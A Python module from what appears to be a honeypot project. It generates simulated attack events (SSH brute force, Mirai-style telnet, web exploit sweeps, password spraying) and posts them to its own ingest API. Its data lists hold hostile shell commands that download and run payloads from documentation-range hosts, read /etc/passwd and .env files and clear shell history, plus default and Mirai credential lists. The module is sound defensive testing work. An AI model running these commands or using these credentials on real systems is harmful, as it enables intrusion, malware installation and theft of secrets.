"""Injection simulator: synthesises days of attack traffic and posts it, signed, to /api/ingest.

A honeypot on localhost receives no real attacks, so this produces data with the shape real
deployments see, split into distinct campaigns:
  - botnet credential stuffing over SSH (many IPs, one shared credential list, automated shells)
  - a targeted human operator (two IPs in one /24, slow guessing, human-paced shell session)
  - Mirai-style IoT telnet scanners (fast, default creds, busybox probes, one large burst)
  - web exploit sweeps across all nodes (CVE paths, scanner User-Agents)
  - password spraying (one password, many usernames)
  - internet research scanners (Censys/Shodan style banner grabs)

Every event is flagged simulated=true. Source IPs are random public addresses; their country/ASN
attribution is synthetic (ASNs from the private-use range 64512-65534, names prefixed SIM-) and
is only used when no real geo database answers. None of it describes a real network.
"""

from __future__ import annotations

import ipaddress
import random
import time
import uuid

import httpx

from ..sensors.fakeshell import extract_urls
from ..signing import build_envelope
from .live import HTTP_PROBES

NODES = {"node-lon": "eu-west (London)", "node-fra": "eu-central (Frankfurt)",
         "node-nyc": "us-east (New York)", "node-sgp": "ap-southeast (Singapore)"}

BOT_CREDS = [("root", "123456"), ("root", "root"), ("admin", "admin"), ("root", "password"), ("root", "12345678"),
             ("ubuntu", "ubuntu"), ("root", "1qaz2wsx"), ("test", "test"), ("oracle", "oracle"), ("user", "user"),
             ("root", "admin123"), ("postgres", "postgres"), ("git", "git"), ("pi", "raspberry"), ("root", "toor"),
             ("root", "P@ssw0rd"), ("admin", "123456"), ("hadoop", "hadoop"), ("root", "qwerty"), ("ftpuser", "ftpuser"),
             ("deploy", "deploy"), ("root", "1234"), ("ubnt", "ubnt"), ("root", "000000"), ("es", "es"),
             ("minecraft", "minecraft"), ("root", "Aa123456"), ("guest", "guest"), ("root", "abc123"), ("admin", "password")]
MIRAI_CREDS = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"), ("root", "xmhdipc"),
               ("root", "default"), ("root", "juantech"), ("support", "support"), ("root", "54321"), ("root", "hi3518"),
               ("admin", "1111"), ("root", "Zte521"), ("root", "7ujMko0admin"), ("root", "anko")]
TARGET_PASSWORDS = ["Shop2024!", "shop2024", "Deploy123", "deploy@123", "Sh0p!2024", "Summer2026!", "welcome1",
                    "Admin@2026", "shopadmin", "ShopProd1", "changeme", "Passw0rd!", "Spring2026", "deploy2026",
                    "qwerty123", "letmein!", "Company123", "Sh0p2024", "shop_prod", "Pr0duction!"]
SPRAY_USERS = ["admin", "administrator", "support", "test", "user", "guest", "info", "sales", "backup", "web",
               "office", "dev", "operator", "service", "manager", "office1", "scanner", "printer", "mail", "ftp",
               "nagios", "zabbix", "jenkins", "sysadmin", "monitor"]
BOT_SCRIPT = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "echo -e '\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B'",
              "cd /tmp || cd /var/run || cd /dev/shm; wget http://{dl}/bins.sh; chmod 777 bins.sh; sh bins.sh",
              "rm -rf bins.sh; history -c"]
MIRAI_SCRIPT = ["enable", "system", "shell", "sh", "/bin/busybox {tag}", "cat /proc/mounts", "/bin/busybox {tag}",
                "cd /tmp; /bin/busybox wget http://{dl}/bins/mirai.{arch} -O .x; chmod 777 .x; ./.x telnet.x86",
                "/bin/busybox {tag}"]
HUMAN_SCRIPT = ["w", "id", "uname -a", "cat /etc/passwd", "ls -la /var/www/html", "cat /var/www/html/.env",
                "crontab -l", "netstat -tlnp", "cd /tmp", "wget http://{dl}/tools/lin.sh", "chmod +x lin.sh",
                "./lin.sh", "history -c", "exit"]
WEB_UAS = ["Go-http-client/1.1", "Mozilla/5.0 zgrab/0.x", "python-requests/2.31.0",
           "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0 Safari/537.36"]
RESEARCH_UAS = ["Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
                "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)",
                "Expanse, a Palo Alto Networks company, searches across the global IPv4 space",
                "Mozilla/5.0 (compatible; Shodan crawler)"]
SSH_CLIENTS = {
    "bot-go": ("SSH-2.0-Go", "b5752e36ba6c5979a575e43178908adf"),
    "bot-libssh": ("SSH-2.0-libssh_0.9.6", "f555226df1963d1d3c09daf865abdc9a"),
    "bot-paramiko": ("SSH-2.0-paramiko_3.4.0", "ae8c84eb0c4ab8a3f1cbb8cc4a4fc8d8"),
    "human": ("SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5", "ec7378c1a92f5a8dde7e8b7a1ddf33d1"),
    "research": ("SSH-2.0-Go", "b5752e36ba6c5979a575e43178908adf"),
}
OPERATOR_KEY = "SHA256:q3Vw0sYb1H5xU2kq9T7fJm8RzLcPd4eNaG6oKiW1yXo"


class Geo:
    """Synthetic attribution: a pool of /16s per country, each mapped to a private-use ASN."""

    COUNTRIES = ["CN", "VN", "BR", "IN", "ID", "RU", "KR", "US", "TW", "AR", "NL", "DE", "SG", "FR", "EG", "TR",
                 "MX", "TH", "IR", "KZ", "GB", "UA", "PK", "CO"]

    def __init__(self, rng: random.Random):
        self.rng = rng
        self.pools: dict[str, list[tuple[str, dict]]] = {}
        asn = 64600
        for cc in self.COUNTRIES:
            pool = []
            for kind in ("HOSTING", "ISP"):
                asn += 1
                pool.append((self._public_16(), {"country": cc, "asn": asn, "as_name": f"SIM-{kind}-{cc}"}))
            self.pools[cc] = pool

    def _public_16(self) -> str:
        while True:
            a, b = self.rng.randint(1, 223), self.rng.randint(0, 255)
            net = ipaddress.ip_network(f"{a}.{b}.0.0/16")
            if net.is_global and not net.is_multicast:
                return f"{a}.{b}"

    def ip(self, cc: str, kind: int | None = None, prefix24: str | None = None) -> tuple[str, dict]:
        base, attrib = self.pools[cc][kind if kind is not None else self.rng.randint(0, 1)]
        if prefix24:
            return f"{prefix24}.{self.rng.randint(2, 254)}", attrib
        return f"{base}.{self.rng.randint(0, 255)}.{self.rng.randint(2, 254)}", attrib


class Builder:
    def __init__(self, days: int, rng: random.Random):
        self.now = time.time()
        self.days = days
        self.rng = rng
        self.events: list[dict] = []

    def when(self, peak_hours: tuple[int, int] | None = None, day: float | None = None) -> float:
        """Random time within the window, optionally biased to a UTC hour range."""
        d = day if day is not None else self.rng.uniform(0, self.days)
        base = self.now - d * 86400
        if peak_hours and self.rng.random() < 0.75:
            lo, hi = peak_hours
            t = time.gmtime(base)
            midnight = base - (t.tm_hour * 3600 + t.tm_min * 60 + t.tm_sec)
            base = midnight + self.rng.uniform(lo, hi) * 3600
        return min(base, self.now - 60)

    def add(self, ts, node, sensor, event_type, ip, sid, geo, port, **fields):
        data = fields.pop("data", {})
        data["sim_geo"] = geo
        data["campaign"] = fields.pop("campaign", None)
        self.events.append({"event_id": uuid.uuid4().hex, "ts": ts, "node_id": node, "region": NODES[node],
                            "sensor": sensor, "event_type": event_type, "src_ip": ip, "src_port": self.rng.randint(1025, 65000),
                            "dst_port": port, "session_id": sid, "simulated": True, "data": data, **fields})

    # ---- session templates --------------------------------------------
    def ssh_session(self, ts, node, ip, geo, creds, campaign, client, gap=(0.3, 1.5), script=None, cmd_gap=(0.05, 0.4),
                    pubkey=None, dl=None):
        sid = uuid.uuid4().hex[:16]
        version, hassh = SSH_CLIENTS[client]
        self.add(ts, node, "ssh", "connect", ip, sid, geo, 22, campaign=campaign)
        self.add(ts + 0.2, node, "ssh", "client_version", ip, sid, geo, 22, campaign=campaign, fingerprint=hassh,
                 data={"client_version": version, "hassh": hassh})
        t = ts + 0.5
        if pubkey:
            self.add(t, node, "ssh", "auth", ip, sid, geo, 22, campaign=campaign, username=creds[0][0], password=None,
                     auth_method="publickey", success=False, key_fingerprint=pubkey, key_type="ssh-ed25519")
            t += 0.3
        success = False
        for i, (u, p) in enumerate(creds):
            success = script is not None and i == len(creds) - 1
            self.add(t, node, "ssh", "auth", ip, sid, geo, 22, campaign=campaign, username=u, password=p,
                     auth_method="password", success=success)
            t += self.rng.uniform(*gap)
        if success:
            for cmd in script:
                cmd = cmd.format(dl=dl or "198.51.100.23")
                self.add(t, node, "ssh", "command", ip, sid, geo, 22, campaign=campaign, command=cmd,
                         data={"mode": "shell"})
                for url in extract_urls(cmd):
                    self.add(t, node, "ssh", "download_attempt", ip, sid, geo, 22, campaign=campaign,
                             data={"url": url, "fetched": False})
                t += self.rng.uniform(*cmd_gap)
        self.add(t, node, "ssh", "session_end", ip, sid, geo, 22, campaign=campaign, success=success,
                 data={"duration": round(t - ts, 2)})

    def telnet_session(self, ts, node, ip, geo, creds, campaign, tag, dl):
        sid = uuid.uuid4().hex[:16]
        self.add(ts, node, "telnet", "connect", ip, sid, geo, 23, campaign=campaign)
        t = ts + 0.3
        for i, (u, p) in enumerate(creds):
            self.add(t, node, "telnet", "auth", ip, sid, geo, 23, campaign=campaign, username=u, password=p,
                     auth_method="password", success=i == len(creds) - 1)
            t += self.rng.uniform(0.4, 1.0)
        arch = self.rng.choice(["arm7", "mips", "mpsl", "x86", "arm"])
        for cmd in MIRAI_SCRIPT:
            cmd = cmd.format(tag=tag, dl=dl, arch=arch)
            self.add(t, node, "telnet", "command", ip, sid, geo, 23, campaign=campaign, command=cmd, data={"mode": "shell"})
            if "wget" in cmd:
                self.add(t, node, "telnet", "download_attempt", ip, sid, geo, 23, campaign=campaign,
                         data={"url": f"http://{dl}/bins/mirai.{arch}", "fetched": False})
            t += self.rng.uniform(0.05, 0.25)
        self.add(t, node, "telnet", "session_end", ip, sid, geo, 23, campaign=campaign, success=True)

    def http_request(self, ts, node, ip, geo, method, path, headers, body, campaign):
        self.add(ts, node, "http", "http_request", ip, uuid.uuid4().hex[:16], geo, 80, campaign=campaign,
                 method=method, path=path, data={"version": "HTTP/1.1", "headers": headers, "body": body,
                                                 "body_len": len(body)})


def generate(days: int = 14, scale: float = 1.0, seed: int | None = None) -> list[dict]:
    rng = random.Random(seed)
    geo = Geo(rng)
    b = Builder(days, rng)
    nodes = list(NODES)
    n = lambda x: max(1, int(x * scale))  # noqa: E731

    # 1. Botnet credential stuffing: neighbours in shared /24s, same list, automated scripts.
    bot_ccs = ["CN", "VN", "BR", "IN", "ID", "RU", "KR", "US", "TW", "AR"]
    bot_ips = []
    for _ in range(n(15)):
        cc = rng.choice(bot_ccs)
        ip, g = geo.ip(cc)
        prefix = ip.rsplit(".", 1)[0]
        bot_ips.append((ip, g))
        for _ in range(rng.randint(0, 3)):  # infected neighbours in the same /24
            bot_ips.append(geo.ip(cc, prefix24=prefix))
    while len(bot_ips) < n(45):
        bot_ips.append(geo.ip(rng.choice(bot_ccs)))
    for ip, g in bot_ips:
        client = rng.choice(["bot-go", "bot-libssh"])
        for _ in range(rng.randint(1, 3)):
            subset = rng.sample(BOT_CREDS, rng.randint(int(len(BOT_CREDS) * 0.6), len(BOT_CREDS)))
            ts = b.when()
            script = BOT_SCRIPT if rng.random() < 0.3 else None
            b.ssh_session(ts, rng.choice(nodes), ip, g, subset, "botnet-ssh", client, script=script, dl="198.51.100.23")

    # 2. Targeted human operator: one /24, node-lon only, office hours, then a manual session.
    op_ip, op_geo = geo.ip("NL", kind=0)
    op_ip2 = op_ip.rsplit(".", 1)[0] + "." + str((int(op_ip.rsplit(".", 1)[1]) + 7) % 250 + 2)
    first_list = rng.sample(TARGET_PASSWORDS, 12)
    rest = [p for p in TARGET_PASSWORDS if p not in first_list]
    # The operator switches IP and resumes roughly the same list: what links the two addresses.
    lists = (first_list, first_list[:9] + rest[:3])
    for (day, ip), pw in zip(((min(4.3, days * 0.4), op_ip), (min(3.4, days * 0.3), op_ip2)), lists):
        ts = b.when(peak_hours=(7, 15), day=day)
        b.ssh_session(ts, "node-lon", ip, op_geo, [("deploy", p) for p in pw], "targeted-operator", "human",
                      gap=(4, 20), pubkey=OPERATOR_KEY)
    final_ts = b.when(peak_hours=(9, 10), day=min(3.3, days * 0.3))
    b.ssh_session(final_ts, "node-lon", op_ip2, op_geo, [("deploy", "Sh0p!2024"), ("deploy", "Deploy123")],
                  "targeted-operator", "human", gap=(6, 15), script=HUMAN_SCRIPT, cmd_gap=(3, 28),
                  pubkey=OPERATOR_KEY, dl="203.0.113.50")

    # 3. Mirai-style IoT telnet scanners, with one burst inside a two hour window.
    iot_ccs = ["BR", "VN", "IN", "EG", "TR", "MX", "TH", "IR", "CN", "CO", "PK"]
    burst_day = min(3.0, days * 0.25)
    for i in range(n(70)):
        ip, g = geo.ip(rng.choice(iot_ccs), kind=1)
        tag = "".join(rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(5))
        for _ in range(rng.randint(1, 2)):
            ts = b.now - burst_day * 86400 + rng.uniform(0, 7200) if i % 5 < 2 else b.when()
            creds = rng.sample(MIRAI_CREDS, rng.randint(2, 5))
            b.telnet_session(ts, rng.choice(nodes), ip, g, creds, "mirai-telnet", tag, "198.51.100.66")
        if rng.random() < 0.4:  # the same bots also spread through router exploits over HTTP
            probe = rng.choice([p for p in HTTP_PROBES if p[4] == "iot_router_exploit"])
            b.http_request(b.when(), rng.choice(nodes), ip, g, probe[0], probe[1], {"User-Agent": "Hello, world"},
                           probe[3], "mirai-telnet")

    # 4. Web exploit sweeps from hosting ranges, every node, many CVE paths.
    exploit_probes = [p for p in HTTP_PROBES if p[4] not in ("scan",)]
    for _ in range(n(18)):
        ip, g = geo.ip(rng.choice(["US", "NL", "DE", "SG", "FR", "GB"]), kind=0)
        ua = rng.choice(WEB_UAS)
        for _ in range(rng.randint(1, 3)):
            ts = b.when(peak_hours=(0, 6))
            for probe in rng.sample(exploit_probes, rng.randint(6, len(exploit_probes))):
                headers = dict(probe[2])
                if "User-Agent" not in headers or rng.random() < 0.5:
                    headers["User-Agent"] = ua
                b.http_request(ts, rng.choice(nodes), ip, g, probe[0], probe[1], headers, probe[3], "web-exploit-sweep")
                ts += rng.uniform(0.1, 2.0)

    # 5. Password spraying: two passwords against many usernames, slowly.
    for _ in range(n(4)):
        ip, g = geo.ip(rng.choice(["RU", "KZ", "UA"]), kind=0)
        password = rng.choice(["Password123!", "Welcome1"])
        ts = b.when()
        users = rng.sample(SPRAY_USERS, 20)
        for chunk in range(0, len(users), 5):
            b.ssh_session(ts, rng.choice(nodes), ip, g, [(u, password) for u in users[chunk:chunk + 5]],
                          "password-spray", "bot-paramiko", gap=(2, 5))
            ts += rng.uniform(30, 90)

    # 6. Research scanners: banner grabs and plain GETs, spread evenly over the day.
    for _ in range(n(10)):
        ip, g = geo.ip(rng.choice(["US", "DE", "GB"]), kind=0)
        ua = rng.choice(RESEARCH_UAS)
        for _ in range(rng.randint(2, 5)):
            node, ts = rng.choice(nodes), b.when()
            b.http_request(ts, node, ip, g, "GET", "/", {"User-Agent": ua, "Accept": "*/*"}, "", "research-scan")
            sid = uuid.uuid4().hex[:16]
            b.add(ts + 1, node, "ssh", "connect", ip, sid, g, 22, campaign="research-scan")
            b.add(ts + 1.2, node, "ssh", "client_version", ip, sid, g, 22, campaign="research-scan",
                  fingerprint=SSH_CLIENTS["research"][1], data={"client_version": "SSH-2.0-Go", "hassh": SSH_CLIENTS["research"][1]})
            b.add(ts + 2, node, "banner", "banner", ip, uuid.uuid4().hex[:16], g, 6379, campaign="research-scan",
                  data={"profile": "redis", "preview": "*1..$4..INFO..", "first_bytes_hex": "2a310d0a24340d0a494e464f0d0a",
                        "length": 14})
    b.events.sort(key=lambda e: e["ts"])
    return b.events


def post_events(events: list[dict], collector_url: str, node_secrets: dict[str, str], batch: int = 500) -> dict:
    """Sign and POST events per node, plus one simulated heartbeat per synthetic node."""
    url = collector_url.rstrip("/") + "/api/ingest"
    by_node: dict[str, list[dict]] = {}
    for ev in events:
        by_node.setdefault(ev.pop("node_id"), []).append(ev)
    accepted, errors = 0, []
    with httpx.Client(timeout=30) as client:
        for node, evs in by_node.items():
            secret = node_secrets.get(node)
            if not secret:
                errors.append(f"no secret for {node}")
                continue
            body, headers = build_envelope(node, secret, "heartbeat", {"node": {
                "region": NODES.get(node, node), "sensors": ["ssh:22", "telnet:23", "http:80", "banner:6379"],
                "version": "sim", "uptime": 0, "spool_backlog": 0, "simulated": True}})
            client.post(url, content=body, headers=headers)
            for i in range(0, len(evs), batch):
                body, headers = build_envelope(node, secret, "events", {"events": evs[i:i + batch]})
                resp = client.post(url, content=body, headers=headers)
                if resp.status_code == 200:
                    accepted += resp.json().get("inserted", 0)
                else:
                    errors.append(f"{node}: {resp.status_code} {resp.text[:120]}")
    return {"generated": len(events), "inserted": accepted, "nodes": sorted(by_node), "errors": errors}


def run(collector_url: str, node_secrets: dict[str, str], days: int = 14, scale: float = 1.0, seed: int | None = None) -> dict:
    events = generate(days, scale, seed)
    campaigns: dict[str, int] = {}
    for e in events:
        c = e["data"].get("campaign")
        campaigns[c] = campaigns.get(c, 0) + 1
    result = post_events(events, collector_url, node_secrets)
    result["campaign_events"] = campaigns
    return result
